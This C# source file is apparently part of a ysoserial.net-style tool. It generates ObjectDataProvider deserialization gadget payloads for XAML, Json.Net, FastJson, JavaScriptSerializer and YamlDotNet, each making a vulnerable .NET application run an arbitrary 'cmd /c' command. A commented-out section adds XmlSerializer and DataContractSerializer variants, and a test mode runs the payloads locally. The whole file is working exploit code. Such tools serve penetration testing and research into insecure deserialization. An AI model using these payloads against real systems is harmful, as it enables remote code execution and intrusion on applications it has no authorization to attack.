using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using fastJSON;
using Newtonsoft.Json;
using System.Web.Script.Serialization;
using System.Xml;
using System.Xml.Serialization;
using YamlDotNet.Serialization;
using System.Windows.Markup;
using System.Diagnostics;
using System.Windows.Data;
using System.Reflection;
using System.Collections.Specialized;

namespace ysoserial_frmv2.Generators
{
    class ObjectDataProviderGenerator : GenericGenerator
    {
        public override string Description()
        {
            return "ObjectDataProvider Gadget by Oleksandr Mirosh and Alvaro Munoz";
        }

        public override List<string> SupportedFormatters()
        {
            // System.Data.Services.Internal.ExpandedWrapper is not available in .NET Framework 2.0
            // "XmlSerializer" and "DataContractSerializer" have been removed from the following list
            return new List<string> { "Xaml", "Json.Net", "FastJson", "JavaScriptSerializer", "YamlDotNet < 5.0.0" };
        }

        public override string Name()
        {
            return "ObjectDataProvider";
        }

        public override object Generate(string cmd, string formatter, Boolean test)
        {
            if (formatter.ToLower().Equals("xaml"))
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd";
                psi.Arguments = "/c " + cmd;
                StringDictionary dict = new StringDictionary();
                psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                Process p = new Process();
                p.StartInfo = psi;
                ObjectDataProvider odp = new ObjectDataProvider();
                odp.MethodName = "Start";
                odp.IsInitialLoadEnabled = false;
                odp.ObjectInstance = p;

                string payload  = XamlWriter.Save(odp);

                if (test)
                {
                    try
                    {
                        StringReader stringReader = new StringReader(payload);
                        XmlReader xmlReader = XmlReader.Create(stringReader);
                        XamlReader.Load(xmlReader);
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            if (formatter.ToLower().Equals("json.net"))
            {
                String payload = @"{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/c " + cmd + @"']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}";
                if (test)
                {
                    try
                    {
                        Object obj = JsonConvert.DeserializeObject<Object>(payload, new JsonSerializerSettings
                        {
                            TypeNameHandling = TypeNameHandling.Auto
                        }); ;
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("fastjson"))
            {
                String payload = @"{
    ""$types"":{
        ""System.Windows.Data.ObjectDataProvider, PresentationFramework, Version = 3.0.0.0, Culture = neutral, PublicKeyToken = 31bf3856ad364e35"":""1"",
        ""System.Diagnostics.Process, System, Version = 2.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""2"",
        ""System.Diagnostics.ProcessStartInfo, System, Version = 2.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""3""
    },
    ""$type"":""1"",
    ""ObjectInstance"":{
        ""$type"":""2"",
        ""StartInfo"":{
            ""$type"":""3"",
            ""FileName"":""cmd"",
            ""Arguments"":""/c " + cmd + @"""
        }
    },
    ""MethodName"":""Start""
}";
                if (test)
                {
                    try
                    {
                        var instance = JSON.ToObject<Object>(payload);

                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("javascriptserializer"))
            {
                String payload = @"{
    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'ObjectInstance':{
        '__type':'System.Diagnostics.Process, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        'StartInfo': {
            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
            'FileName':'cmd',
            'Arguments':'/c " + cmd + @"'
        }
    }
}";
                if (test)
                {
                    try
                    {
                        JavaScriptSerializer jss = new JavaScriptSerializer(new SimpleTypeResolver());
                        var json_req = jss.Deserialize<Object>(payload);
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            /*
            else if (formatter.ToLower().Equals("xmlserializer"))
            {
                String payload = $@"<?xml version=""1.0""?>
<root xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfXamlReaderObjectDataProvider>
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">
                    &lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; xmlns:System=&quot;clr-namespace:System;assembly=mscorlib&quot; xmlns:Diag=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;
                        &lt;ObjectDataProvider x:Key=&quot;LaunchCmd&quot; ObjectType=&quot;{{x:Type Diag:Process}}&quot; MethodName=&quot;Start&quot;&gt;
                            &lt;ObjectDataProvider.MethodParameters&gt;
                                &lt;System:String&gt;cmd&lt;/System:String&gt;
                                &lt;System:String&gt;/c {cmd}&lt;/System:String&gt;
                            &lt;/ObjectDataProvider.MethodParameters&gt;
                        &lt;/ObjectDataProvider&gt;
                    &lt;/ResourceDictionary&gt;
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type=""XamlReader""></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
";
                if (test)
                {
                    try
                    {
                        var xmlDoc = new XmlDocument();
                        xmlDoc.LoadXml(payload);
                        XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
                        var s = new XmlSerializer(Type.GetType(xmlItem.GetAttribute("type")));
                        var d = s.Deserialize (new XmlTextReader(new StringReader(xmlItem.InnerXml)));
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {
                String payload = $@"<?xml version=""1.0""?>
<root xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal""
                                                         xmlns:i=""http://www.w3.org/2001/XMLSchema-instance""
                                                         xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"">
      <ExpandedElement z:Id=""ref1"" xmlns:a=""http://schemas.datacontract.org/2004/07/System.Diagnostics"">
        <__identity i:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System""/>
      </ExpandedElement>
      <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">
        <a:MethodName>Start</a:MethodName>
        <a:MethodParameters xmlns:b=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
          <b:anyType i:type=""c:string"" xmlns:c=""http://www.w3.org/2001/XMLSchema"">cmd</b:anyType>
          <b:anyType i:type=""c:string"" xmlns:c=""http://www.w3.org/2001/XMLSchema"">/c {cmd}</b:anyType>
        </a:MethodParameters>
        <a:ObjectInstance z:Ref=""ref1""/>
      </ProjectedProperty0>
    </ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL>
</root>
";
                if (test)
                {
                    try
                    {
                        var xmlDoc = new XmlDocument();
                        xmlDoc.LoadXml(payload);
                        XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
                        var s = new DataContractSerializer(Type.GetType(xmlItem.GetAttribute("type")));
                        var d = s.ReadObject(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            */
            else if (formatter.ToLower().Equals("yamldotnet"))
                {
                String payload = @"
!<!System.Windows.Data.ObjectDataProvider%2c%20PresentationFramework%2c%20Version=3.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=31bf3856ad364e35> {
    MethodName: Start,
	ObjectInstance: 
		!<!System.Diagnostics.Process%2c%20System%2c%20Version=2.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=b77a5c561934e089> {
			StartInfo:
				!<!System.Diagnostics.ProcessStartInfo%2c%20System%2c%20Version=2.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=b77a5c561934e089> {
					FileName : cmd,
					Arguments : '/C " + cmd + @"'

                }
        }
}";
                if (test)
                {
                    try
                    {
                        //to bypass all of the vulnerable version's type checking, we need to set up a stream
                        using (var reader = new StreamReader(new MemoryStream(System.Text.Encoding.UTF8.GetBytes(payload))))
                        {
                            var deserializer = new DeserializerBuilder().Build();
                            var result = deserializer.Deserialize(reader);
                        }
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
